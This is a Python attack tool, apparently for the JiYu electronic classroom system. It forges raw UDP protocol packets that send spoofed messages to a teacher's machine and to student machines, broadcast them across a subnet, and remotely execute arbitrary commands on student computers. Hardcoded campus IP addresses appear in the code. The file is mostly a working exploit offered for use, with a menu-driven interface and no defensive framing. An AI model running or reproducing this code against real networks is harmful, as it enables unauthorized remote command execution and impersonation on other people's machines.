import socket

s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
#s.bind(("218.195.213.107",52173))

#dst = ("218.195.213.88",5512)
#dst = ("218.195.213.107",4705)

group_address = "224.50.50.42"
teacher_address = "218.195.208.1"

def data_to_unicode_hex(data):
    ret_data = []
    unicode = data.encode("unicode-escape")
    unicode = str(unicode)[2:-1]
    state = 0
    c = 0
    while c < len(unicode):
        if unicode[c:c+3] == "\\\\u":
            c += 3
            ret_data.append(int(unicode[c+2:c+4],16))
            ret_data.append(int(unicode[c:c+2],16))
            c += 4
        else:
            ret_data.append(unicode[c].encode()[0])
            ret_data.append(0)
            c += 1
    out = b""
    for i in ret_data:
        out += i.to_bytes(length=1,byteorder='big',signed=False)
    return out

def send_msg_to_client(target,info):
    info = data_to_unicode_hex(info)
    data =  b"\x44\x4d\x4f\x43\x00\x00\x01\x00\x9e\x03\x00\x00\x10\x8f\xe8\x3e"
    data += b"\x76\x6e\xb3\x4a\x9e\x09\x05\xa4\xc7\x8e\x4a\x64\x20\x4e\x00\x00"
    data += b"\xda\xc3\xd5\x58\x91\x03\x00\x00\x91\x03\x00\x00\x00\x08\x00\x00"
    data += b"\x00\x00\x00\x00\x05\x00\x00\x00"
    data += info
    #data += b"\x31\x00\x32\x00\x33\x00\x34\x00\x35\x00"
    data += b"\x00"*(954 - len(data) -2)
    data += b"\x22\x00"
    s.sendto(data,(target,4705))


def send_command_to_client(target,command,args=""):
    command = command.encode("gbk")
    args = args.encode("gbk")
    data =  b"\x44\x4d\x4f\x43\x00\x00\x01\x00\x6e\x03\x00\x00\x2a\xd4\x98\xcb"
    data += b"\x7a\x40\x5b\x46\xb0\xc6\x85\xd4\xdf\xa7\x17\xee\x20\x4e\x00\x00"
    data += b"\xda\xc3\xd5\x58\x61\x03\x00\x00\x61\x03\x00\x00\x00\x02\x00\x00"
    data += b"\x00\x00\x00\x00\x0f\x00\x00\x00\x01\x00\x00\x00"
    for i in command:
        data += i.to_bytes(length=1,byteorder='big',signed=False)
        data += b"\x00"
    data += b"\x00"*(573-len(data))
    for i in args:
        data += i.to_bytes(length=1,byteorder='big',signed=False)
        data += b"\x00"
    data += b"\x00"*(906-len(data)-10)
    data += b"\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    s.sendto(data,(target,4705))


def send_msg_to_teacher(target,info):
    data =  b"\x4d\x45\x53\x53\x01\x00\x00\x00\x01\x00\x00\x00\xda\xc3\xd5\x58"
    data += b"\x91\x03\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00"
    data += data_to_unicode_hex(info)
    data += b"\x00"*(929-len(data))
    s.sendto(data,(target,5512))


def black_screen(target):
    """
        暂时不可用
    """
    seta = b"\x4d\x45\x53\x53\x01\x00\x00\x00\x01\x00\x00\x00\xda\xc3\xd5\x6b"
    seta+= b"\x27\x00\x00\x00\x20\x00\x00\x00\x00\x00\x00\x80\x01\x00\x00\x00"
    seta+= b"\x01\x00\x00\x00\x0a\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\x00"
    seta+= b"\x00\x00\x00\x00\xa0\x05\x10"
    
    setb = b"\x4d\x45\x53\x53\x01\x00\x00\x00\x01\x00\x00\x00\xda\xc3\xd5\x6b"
    setb+= b"\x27\x00\x00\x00\x20\x00\x00\x00\x00\x00\x00\x80\x01\x00\x00\x00"
    setb+= b"\x01\x00\x00\x00\x0a\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\x00"
    setb+= b"\x00\x00\x00\x00\xa0\x05\x10"

    setc = b"\x4d\x45\x53\x53\x01\x00\x00\x00\x01\x00\x00\x00\xda\xc3\xd5\x6b"
    setc+= b"\x0d\x00\x00\x00\x20\x00\x00\x00\x00\x00\x00\x90\x01"

    s.sendto(setc,(target,5512))


def menu():
    print("1. 发送信息给教师机")
    print("2. 发送信息给指定学生机器")
    print("3. 发送信息给任意学生机器")
    print("4. 学生机命令执行")
    print("5. 学生机命令指定网段学生机器")
    return int(input(">"))

def main():
    print("="*100)
    print("极域电子教室破解版终端")
    print("Powerin nekokami")
    while True:
        try:
            s = menu()
            if s == 1:
                print("[+] 发送信息给教师机")
                msg = input("请输入要发送的内容>")
                send_msg_to_teacher(teacher_address,msg)
            elif s == 2:
                print("[+] 发送信息给指定学生机器")
                addr = input("请输入IP>")
                msg = input("请输入要发送的内容>")
                send_msg_to_client(addr,msg)
            elif s  ==3:
                print("[+] 发送信息给任意学生机器")
                msg = input("请输入要发送的内容>")
                send_msg_to_client(group_address,msg)
            elif s == 4:
                print("[+] 学生机命令执行")
                addr = input("请输入IP>")
                command = input("请输入要执行的命令>")
                send_command_to_client(addr,command)
            elif s == 5:
                print("[+] 发送信息给指定网段学生机器")
                addr = input("请输入IP字符串>")
                lens = int(input("请输入长度>"))
                msg = input("请输入要发送的内容>")
                for i in range(lens):
                    send_msg_to_client(addr%i,msg)
            else:
                print("未知指令")
        except KeyboardInterrupt:
            break


if __name__ == "__main__":
    main()

